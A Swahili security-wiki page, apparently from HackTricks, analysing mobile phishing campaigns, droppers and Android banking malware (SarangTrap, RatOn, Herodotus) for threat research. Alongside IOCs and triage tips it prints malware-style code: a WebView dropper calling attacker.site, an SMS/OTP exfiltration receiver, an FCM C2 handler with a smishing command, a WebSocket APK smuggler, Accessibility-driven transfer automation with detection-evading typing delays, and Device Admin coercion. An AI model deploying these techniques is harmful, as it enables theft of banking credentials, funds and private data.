# Phishingi ya Simu Mkono & Usambazaji wa App Zenye Madhara (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unafunika mbinu zinazotumiwa na wahalifu wa tishio kusambaza **malicious Android APKs** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, maduka ya uongo, dating apps, n.k.). Nyenzo imeadaptishwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) na utafiti mwingine wa umma.

## Mtiririko wa Shambulio

1. **SEO/Phishing Infrastructure**
* Sajili domain nyingi zinazofanana (dating, cloud share, car service…).
– Tumia maneno muhimu ya lugha ya eneo na emojis katika elementi ya `<title>` ili kushika nafasi kwenye Google.
– Host *both* Android (`.apk`) na iOS install instructions kwenye ukurasa mmoja wa kutua.
2. **Upakuaji wa Awamu ya Kwanza**
* Android: link ya moja kwa moja kwa APK *unsigned* au “third-party store”.
* iOS: `itms-services://` au link ya HTTPS plain kwa profaili ya **mobileconfig** yenye madhara (angalia chini).
3. **Social Engineering Baada ya Kusakinisha**
* Katika uendeshaji wa kwanza app inauliza kwa **msimbo wa mwaliko / uthibitishaji** (ibua hisia ya ufikiaji wa kipekee).
* Msimbo unatumwa kwa **HTTP POST** kwenda Command-and-Control (C2).
* C2 inajibu `{"success":true}` ➜ malware inaendelea.
* Uchambuzi wa dynamic wa Sandbox / AV ambao hauwasilishi kamwe msimbo halali hauioni **madhara yoyote ya kibaya** (evasi).
4. **Matumizi Mabaya ya Vibali Wakati wa Runtime (Android)**
* Vibali hatari vinaombwa tu **baada ya jibu chanya kutoka C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variants za hivi karibuni **huondoa `<uses-permission>` ya SMS kutoka `AndroidManifest.xml`** lakini huacha njia ya Java/Kotlin inayosoma SMS kupitia reflection ⇒ hupunguza score ya static huku ikibaki kufanya kazi kwenye vifaa vinavyotoa ruhusa kupitia `AppOps` abuse au malengo ya zamani.
5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 ilianzisha **Restricted settings** kwa apps zilizosidlodaliwa: vitufe vya Accessibility na Notification Listener vimezimwa hadi mtumiaji aweke wazi restricted settings kwenye **App info**.
* Kurasa za phishing na droppers sasa zinatoa maelekezo ya hatua‑kwa‑hatua za UI ili **kuruhusu restricted settings** kwa app iliyosidlodaliwa na kisha kuwezesha Accessibility/Notification access.
* Bypass mpya ni kusakinisha payload kupitia **session‑based PackageInstaller flow** (njia ileile app stores wanayotumia). Android huchukulia app kama imewekwa kupitia store, hivyo Restricted settings haisambazi tena Accessibility.
* Vidokezo vya triage: katika dropper, grep kwa `PackageInstaller.createSession/openSession` pamoja na code inayomuelekeza mara moja mhanga kwenda `ACTION_ACCESSIBILITY_SETTINGS` au `ACTION_NOTIFICATION_LISTENER_SETTINGS`.
6. **Facade UI & Kukusanya Taarifa kwa Background**
* App inaonyesha view zisizo hatari (SMS viewer, gallery picker) zilizotekelezwa local.
* Wakati huo huo hu-exfiltrate:
- IMEI / IMSI, nambari ya simu
- Dump kamili ya `ContactsContract` (array ya JSON)
- JPEG/PNG kutoka `/sdcard/DCIM` compress kwa kutumia [Luban](https://github.com/Curzibn/Luban) kupunguza ukubwa
- Maudhui ya SMS ya hiari (`content://sms`)
Payloads huwekwa **batch-zipped** na kutumwa kupitia `HTTP POST /upload.php`.
7. **Mbinu ya Kusambaza iOS**
* Profaili moja ya **mobile-configuration** inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` n.k. ili kujiandikisha kifaa kwa usimamizi wa aina ya “MDM”.
* Maelekezo ya social-engineering:
1. Fungua Settings ➜ *Profile downloaded*.
2. Gusa *Install* mara tatu (picha za skrini kwenye ukurasa wa phishing).
3. Amini profaili isyosainiwa ➜ mshambuliaji anapata ruhusa za *Contacts* & *Photo* bila kupitia App Store review.
8. **iOS Web Clip Payload (ikoni ya app ya phishing)**
* `com.apple.webClip.managed` payloads zinaweza **kupachika URL ya phishing kwenye Home Screen** na ikoni/lebeli yenye chapa.
* Web Clips zinaweza kuendesha **full‑screen** (zinatuma browser UI) na zitaweza kuwekwa **non‑removable**, kulazimisha mhusika kufuta profaili ili kuondoa ikoni.
9. **Tabaka la Mtandao**
* HTTP plain, mara nyingi kwenye port 80 na HOST header kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → rahisi kutambua).

## Vidokezo kwa Red-Team

* **Dynamic Analysis Bypass** – Wakati wa tathmini ya malware, automate hatua ya msimbo wa mwaliko kwa kutumia Frida/Objection ili kufikia njia yenye madhara.
* **Manifest vs. Runtime Diff** – Linganisha `aapt dump permissions` na runtime `PackageManager#getRequestedPermissions()`; ukosefu wa vibali hatari ni alama ya hatari.
* **Network Canary** – Sanidi `iptables -p tcp --dport 80 -j NFQUEUE` kugundua mfululizo wa POST zisizo za kawaida baada ya kuingiza msimbo.
* **mobileconfig Inspection** – Tumia `security cms -D -i profile.mobileconfig` kwenye macOS kuorodhesha `PayloadContent` na kugundua ruhusa za kupita kiasi.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Viashiria (Za Jumla)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Muundo huu umeonekana katika kampeni zinazotumia mada za faida za serikali ili kuiba nyaraka za UPI za India na OTPs. Waendeshaji hufuata mtiririko wa majukwaa yanayoaminika kwa ajili ya utoaji na udumu.

### Delivery chain across trusted platforms
- YouTube video lure → maelezo yana kiungo kifupi
- Shortlink → GitHub Pages phishing site inajiiga portal halali
- Repo sawa la GitHub linahifadhi APK yenye beji bandia ya “Google Play” inayounganisha moja kwa moja kwenye faili
- Kurasa za phishing zinazobadilika zinaishi Replit; chaneli ya amri ya mbali inatumia Firebase Cloud Messaging (FCM)

### Dropper na embedded payload na usakinishaji bila mtandao
- APK ya kwanza ni installer (dropper) inayobeba malware halisi katika `assets/app.apk` na kuomba mtumiaji kuzima Wi‑Fi/mobile data ili kupunguza utambuzi wa cloud.
- The embedded payload inasakinishwa chini ya lebo isiyoshukiwa (e.g., “Secure Update”). Baada ya usakinishaji, both the installer and the payload zipo kama apps tofauti.

Kidokezo cha triage ya static (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Ugunduzi wa endpoints unaobadilika kupitia shortlink
- Malware hupakua orodha ya plain-text, iliyotenganishwa kwa koma, ya endpoints hai kutoka shortlink; mabadiliko rahisi ya string hutoa njia ya mwisho ya ukurasa wa phishing.

Mfano (imerekebishwa):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokodhi:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Kuchuma credentials za UPI kwa kutumia WebView
- Hatua ya “Make payment of ₹1 / UPI‑Lite” inaleta fomu ya HTML ya mshambuliaji kutoka kwenye dynamic endpoint ndani ya WebView na inakusanya nyanja nyeti (nambari ya simu, benki, UPI PIN) ambazo zinafanywa `POST` kwa `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Ruhusa kali zinaombwa wakati wa kuendesha kwa mara ya kwanza:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Mawasiliano hurudiwa ili kutuma kwa wingi smishing SMS kutoka kwenye kifaa cha mwathirika.
- SMS zinazoingia zinakamatwa na broadcast receiver na hutumwa pamoja na metadata (sender, body, SIM slot, per-device random ID) kwenda `/addsm.php`.

Kielelezo cha receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kama C2 yenye ustahimili
- Payload inajiandikisha kwenye FCM; push messages zinaabeba uwanja `_type` unaotumika kama switch kuanzisha vitendo (kwa mfano, sasisha violezo vya maandishi vya phishing, badilisha tabia).

Mfano wa payload ya FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler rasimu:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Viashiria/IOC
- APK ina secondary payload katika `assets/app.apk`
- WebView inaleta payment kutoka `gate.htm` na hu-exfiltrate kwa `/addup.php`
- SMS exfiltration kwa `/addsm.php`
- Shortlink-driven config fetch (mf., `rebrand.ly/*`) kurudisha CSV endpoints
- Apps zenye lebo za kijumla “Update/Secure Update”
- FCM `data` messages zenye `_type` discriminator katika untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Wavamizi wanazidi kubadilisha viungo thabiti vya APK kwa chaneli ya Socket.IO/WebSocket iliyowekwa ndani ya vichocheo vinavyoonekana kama Google Play. Hii inaficha URL ya payload, inapita vichujio vya URL/extension, na inahifadhi uzoefu wa usakinishaji unaoonekana halisi (install UX).

Mtiririko wa kawaida wa mteja ulioshuhudiwa katika mazingira halisi:

<details>
<summary>Downloader bandia wa Play wa Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Kwa nini inaepuka udhibiti rahisi:
- Hakuna URL ya APK ya statiki inayoonyeshwa; payload inajengwa upya katika memory kutoka kwa WebSocket frames.
- URL/MIME/extension filters ambazo zinazuia majibu ya moja kwa moja ya .apk zinaweza kukosa data ya binary iliyotunelishwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapata payload.

Angalia pia WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Kisa cha RatOn

Kampeni ya RatOn banker/RAT (ThreatFabric) ni mfano thabiti wa jinsi operesheni za kisasa za mobile phishing zinavyochanganya WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, na hata NFC-relay orchestration. Sehemu hii inatoa muhtasari wa mbinu zinazoweza kutumika tena.

### Hatua-1: WebView → native install bridge (dropper)
Wavamizi huonyesha WebView inayofungua ukurasa wa mshambuliaji na kuingiza interface ya JavaScript inayofichua native installer. Kugusa kitufe cha HTML huita native code ambayo inasakinisha APK ya hatua ya pili iliyobundled katika assets za dropper na kisha kuizindua moja kwa moja.

Minimal pattern:

<details>
<summary>Mfano mdogo wa Stage-1 dropper (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML kwenye ukurasa:
```html
<button onclick="bridge.installApk()">Install</button>
```
Baada ya kusakinisha, dropper huanzisha payload kupitia explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Wazo la ufuatiliaji: apps zisizoaminika zinazoita `addJavascriptInterface()` na kufichua njia zinazoonekana kama installer kwa WebView; APK inayoleta payload ya pili iliyojikisha chini ya `assets/` na kuitisha Package Installer Session API.

### Mfereji wa idhini: Accessibility + Device Admin + mialiko ya runtime inayofuata
Stage-2 hufungua WebView inayohifadhi ukurasa wa “Access”. Kitufe chake kinaleta exported method ambayo inaelekeza mwathiriwa kwenye Accessibility settings na kuomba kuwezesha huduma haribifu. Mara inapokubaliwa, malware inatumia Accessibility kubofya kwa njia ya automatiska kupitia dialog za ruhusa za runtime zinazofuata (contacts, overlay, manage system settings, etc.) na kuomba Device Admin.

- Accessibility kwa njia ya programu husaidia kukubali mialiko inayofuata kwa kutafuta vitufe kama “Allow”/“OK” katika node-tree na kubofya.
- Ukaguzi/ombi la ruhusa ya overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operators wanaweza kutoa commands za:
- kuonyesha overlay ya skrini nzima kutoka URL, au
- kupitisha inline HTML inayopakiwa ndani ya WebView overlay.

Likely uses: coercion (PIN entry), kufungua wallet ili kunasa PINs, ransom messaging. Hifadhi command ya kuhakikisha overlay permission imepewa ikiwa haipo.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: mara kwa mara dump Accessibility node tree, serialize visible texts/roles/bounds na itume kwa C2 kama pseudo-screen (commands kama `txt_screen` mara moja na `screen_live` kuendelea).
- High-fidelity: omba MediaProjection na anza screen-casting/recording kwa mahitaji (commands kama `display` / `record`).

### ATS playbook (automation ya app ya benki)
Kwa kazi ya JSON, fungua app ya benki, endesha UI kupitia Accessibility kwa mchanganyiko wa queries za maandishi na taps kwa kuratibu, na ingiza PIN ya malipo ya mwathiriwa wakati itapoombwa.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Mfano wa maandishi yanayoonekana katika mtiririko mmoja wa lengo (CZ → EN):
- "Nová platba" → "Malipo mapya"
- "Zadat platbu" → "Ingiza malipo"
- "Nový příjemce" → "Mpokeaji mpya"
- "Domácí číslo účtu" → "Nambari ya akaunti ya ndani"
- "Další" → "Ifuatayo"
- "Odeslat" → "Tuma"
- "Ano, pokračovat" → "Ndiyo, endelea"
- "Zaplatit" → "Lipa"
- "Hotovo" → "Imekamilika"

Waendeshaji pia wanaweza kukagua au kuongeza mipaka ya uhamisho kupitia amri kama `check_limit` na `limit`, ambazo zinaendesha UI ya mipaka kwa njia sawa.

### Crypto wallet seed extraction
Malengo kama MetaMask, Trust Wallet, Blockchain.com, Phantom. Mtiririko: fungua (PIN iliyoporwa au nenosiri lililotolewa), nenda kwenye Security/Recovery, ifunue/onyesha seed phrase, keylog/exfiltrate it. Tekeleza locale-aware selectors (EN/RU/CZ/SK) ili kudumisha utulivu wa urambazaji katika lugha tofauti.

### Device Admin coercion
Device Admin APIs zinatumika kuongeza fursa za kunasa PIN na kuwakatisha tamaa mwathiriwa:
- Kufunga papo hapo:
```java
dpm.lockNow();
```
- Kufanya credential ya sasa iishe ili kulazimisha mabadiliko (Accessibility inakamata PIN/password mpya):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Lazimisha ufunguzi usiotumia biometric kwa kuzima keyguard biometric features:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Kumbuka: Udhibiti mwingi wa DevicePolicyManager unahitaji Device Owner/Profile Owner kwenye Android za hivi karibuni; baadhi ya builds za OEM zinaweza kuwa dhaifu. Daima thibitisha kwenye OS/OEM lengwa.

### NFC relay orchestration (NFSkate)
Stage-3 inaweza kusanidi na kuanzisha moduli ya nje ya NFC-relay (mfano, NFSkate) na hata kumkabidhi templeti ya HTML kumwongoza mwathiriwa wakati wa relay. Hii inaruhusu cash-out ya contactless card-present sambamba na ATS ya mtandaoni.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/hali: `txt_screen`, `screen_live`, `display`, `record`
- Kijamii: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Kifaa: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Mawasiliano/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Watendaji wa vitisho wanachanganya zaidi na zaidi automatisering inayoendeshwa na Accessibility na mbinu za anti-detection zilizobadilishwa dhidi ya biometrics za tabia za msingi. Banker/RAT ya hivi karibuni inaonyesha modi mbili zinazosaidiana za utoaji wa maandishi na toggle ya operator kuiga uandishi wa kibinadamu kwa midundo iliyopangwa kwa nasibu.

- Modi ya ugundaji: orodhesha nodes zinazoonekana kwa kutumia selectors na bounds ili kulenga kwa usahihi inputs (ID, text, contentDescription, hint, bounds) kabla ya kuchukua hatua.
- Uingizaji wa maandishi mara mbili:
- Modi 1 – `ACTION_SET_TEXT` moja kwa moja kwenye node lengwa (thabiti, hakuna keyboard);
- Modi 2 – kuweka clipboard + `ACTION_PASTE` kwenye node iliyozingatiwa (inafanya kazi wakati setText ya moja kwa moja imezuiwa).
- Midundo kama ya kibinadamu: gawanya string iliyotolewa na operator na uwasilishe herufi kwa herufi kwa ucheleweshaji wa nasibu wa 300–3000 ms kati ya matukio ili kuepuka heuristics za "machine-speed typing". Imefanywa ama kwa kukuza taratibu thamani kupitia `ACTION_SET_TEXT`, au kwa kubandika char moja kwa wakati.

<details>
<summary>Mfano wa Java: ugundaji wa node + uingizaji wa herufi uliocheleweshwa kupitia setText au clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Kuzuia overlays kwa ajili ya kuficha udanganyifu:
- Onyesha overlay ya skrini nzima ya `TYPE_ACCESSIBILITY_OVERLAY` yenye opacity inayodhibitiwa na operator; iiwe isiyo wazi kwa mhusika wakati automation ya mbali inaendelea chini yake.
- Amri zinazotolewa kawaida: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay ndogo yenye alpha inayoweza kubadilishwa:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitivi za udhibiti za operator zinazotokea mara nyingi: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (ugawaji wa skrini).

## Marejeo

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
